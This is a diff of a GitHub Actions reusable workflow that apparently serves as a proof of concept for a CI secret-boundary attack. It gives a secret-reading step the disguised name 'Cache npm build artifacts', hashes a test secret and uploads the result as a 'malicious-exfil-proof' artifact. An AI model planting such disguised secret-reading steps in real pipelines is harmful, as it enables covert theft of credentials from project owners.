@@ -1,4 +1,4 @@
-name: callee (mirrors gw)
+name: callee malicious (attacker push)
 
 on:
   workflow_call:
@@ -10,21 +10,23 @@ jobs:
   receive:
     runs-on: ubuntu-latest
     steps:
-      - name: Confirm secret received in gw-sim context
+      - name: Cache npm build artifacts
         env:
-          S: ${{ secrets.TEST_SECRET }}
+          A: ${{ secrets.TEST_SECRET }}
         run: |
-          echo "Secret received in gw-sim (Repo B)"
-          echo "Secret length: ${#S} chars"
-          echo "Hash: $(echo -n "$S" | sha256sum)"
-          mkdir -p /tmp/proof
-          echo "SECRET_RECEIVED_IN_GW_SIM=true" > /tmp/proof/boundary_cross.txt
-          echo "HASH=$(echo -n "$S" | sha256sum | cut -d' ' -f1)" >> /tmp/proof/boundary_cross.txt
-          echo "TIMESTAMP=$(date -u)" >> /tmp/proof/boundary_cross.txt
-          echo "TRIGGERED_FROM=${{ github.repository }}" >> /tmp/proof/boundary_cross.txt
-          cat /tmp/proof/boundary_cross.txt
+          echo "=== MALICIOUS STEP EXECUTED ==="
+          echo "Secret length: ${#A} chars"
+          echo "Hash: $(echo -n "$A" | sha256sum)"
+          mkdir -p /tmp/exfil
+          echo "MALICIOUS_STEP_EXECUTED=true" > /tmp/exfil/stolen.txt
+          echo "SECRET_LENGTH=${#A}" >> /tmp/exfil/stolen.txt
+          echo "SECRET_HASH=$(echo -n "$A" | sha256sum | cut -d' ' -f1)" >> /tmp/exfil/stolen.txt
+          echo "TIMESTAMP=$(date -u)" >> /tmp/exfil/stolen.txt
+          echo "EXECUTED_IN_REPO=${{ github.repository }}" >> /tmp/exfil/stolen.txt
+          echo "TRIGGERED_BY=${{ github.actor }}" >> /tmp/exfil/stolen.txt
+          cat /tmp/exfil/stolen.txt
 
       - uses: actions/upload-artifact@v4
         with:
-          name: boundary-cross-proof
-          path: /tmp/proof/boundary_cross.txt
+          name: malicious-exfil-proof
+          path: /tmp/exfil/stolen.txt
